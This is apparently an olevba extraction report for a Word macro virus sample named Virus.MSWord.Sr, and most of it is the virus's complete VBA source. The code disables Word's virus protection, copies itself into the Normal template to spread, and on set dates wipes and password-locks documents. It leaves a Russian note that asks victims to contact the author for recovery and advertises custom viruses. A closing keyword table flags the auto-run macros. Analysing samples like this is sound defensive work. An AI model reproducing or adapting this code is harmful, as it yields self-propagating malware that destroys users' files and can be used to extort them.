olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sr
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sr - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Sr - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ModuleName = "Sr"

Sub Stp()
    On Error Resume Next
    zz = Word.ActiveDocument.FullName
    ee = Normal.ThisDocument.FullName

  Application.OrganizerCopy Source:=ee, _
    Destination:=zz, Name:="Sr", _
    Object:=3
      
  Application.OrganizerCopy Source:=zz, _
    Destination:=ee, Name:="Sr", _
    Object:=3
      
    Word.NormalTemplate.Save
End Sub

Sub AutoNew()
    Word.Options.VirusProtection = False
    ActiveDocument.Saved = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Application.Caption = "T" + ""
End Sub

Sub AutoOpen()
    Word.Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    ActiveDocument.Saved = False
    Application.Caption = "T" + ""
    Stp
End Sub

Sub AutoClose()
    Word.Options.VirusProtection = False
    Application.Caption = "TMicrosoft Word"
    Stp
    df = Word.ActiveDocument.FullName
    qq = DateTime.Date
    Drr = Word.Application.Path + "\" + "dc"
    If (Dir(Drr, vbDirectory) = "") Then MkDir (Drr)
    Pat = Word.Application.Path + "\" + "dc" + "\" + ActiveDocument.Name
    If qq = "25.06.01" Or qq = "26.06.01" Or qq = "27.06.01" Or qq = "28.06.01" Or qq = "29.06.01" Or qq = "30.06.01" Then
    Application.ActiveDocument.Password = "agl"
    ActiveDocument.Saved = False
    If ActiveDocument.Content.Find.Execute(FindText:="Hi.") = False Then
    ActiveDocument.SaveAs (Pat)
    Word.RecentFiles.Item(1).Delete
    End If
    ActiveDocument.Select
    Selection.Delete
    Selection.TypeText ("Hi.")
    Selection.TypeParagraph
    Selection.TypeText ("Данный вирус, это мой первий вирус, пока я тольку учусь, ответ на вопрос: как востановить свои данные вы, пока еще, сможете получить написав мне.")
    Selection.TypeParagraph
    Selection.TypeText (" Мой адрес treon9875@rambler.ru . До встречи! Кому нужен специализированный вирус пишите, всегда рад помочь")
    Selection.TypeParagraph
    Word.ActiveWindow.WindowState = wdWindowStateNormal
    Word.ActiveWindow.Width = 10
    End If
    Application.ActiveDocument.Password = ""
    ActiveDocument.Saved = False
    If Word.ActiveDocument.Path = "" Then
    ActiveDocument.Saved = True
    ActiveDocument.Saved = False
    Else: ActiveDocument.SaveAs (df)
    End If
    Application.Caption = ""
End Sub

'Sub viewvbcode()
'MsgBox ("Эта возможность заблокирована")
'uf.Show
'If a <> "семья" Then MsgBox ("Пароль не верен") Else Word.WordBasic.AppActivate ("пароль введен")

'End Sub
 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
+----------+--------------------+---------------------------------------------+

